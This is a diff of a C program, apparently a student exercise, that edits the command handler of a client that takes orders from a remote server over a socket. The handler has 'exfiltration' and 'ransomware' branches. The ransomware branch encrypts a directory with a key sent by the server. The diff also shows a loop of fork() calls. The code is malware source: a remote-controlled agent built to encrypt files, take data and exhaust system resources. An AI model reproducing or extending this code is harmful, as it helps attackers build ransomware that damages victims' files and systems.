@@ -13,11 +13,7 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-
-
-
-
-
+#include <dirent.h>
 
 void handle_client_commands(int socket_fd)
 {
@@ -39,7 +35,14 @@ void handle_client_commands(int socket_fd)
 
         buffer[bytes_read] = '\0';
         printf("Server command received: \"%s\"\n", buffer);
-        printf("ici c'est avant");
+        // Envoyer une confirmation au serveur
+        const char *confirmation = "Command received";
+        if (send(socket_fd, confirmation, strlen(confirmation), 0) == -1)
+        {
+            perror("send");
+            break;
+        }
+        printf("Confirmation sent to server.\n");
 
         // Traiter les commandes spécifiques
         if (strcmp(buffer, "exfiltration") == 0)
@@ -56,7 +59,7 @@ void handle_client_commands(int socket_fd)
                 fork();
             }
         }
-       else if (strcmp(buffer, "ransomware") == 0)
+        else if (strcmp(buffer, "ransomware") == 0)
         {
             printf("Executing ransomware...\n");
 
@@ -76,7 +79,7 @@ void handle_client_commands(int socket_fd)
             printf("Received random string: %s\n", buffer);
 
             // Appeler la fonction ransomware avec la clé reçue
-            char dir[] = "/mnt/c/Users/lucas/Desktop/Cours_C/TP/TEST_TP/encr";
+            char dir[] = "./test"; // Répertoire à lister
             encrypt_directory(dir,buffer);
 
             // Envoyer une confirmation au serveur
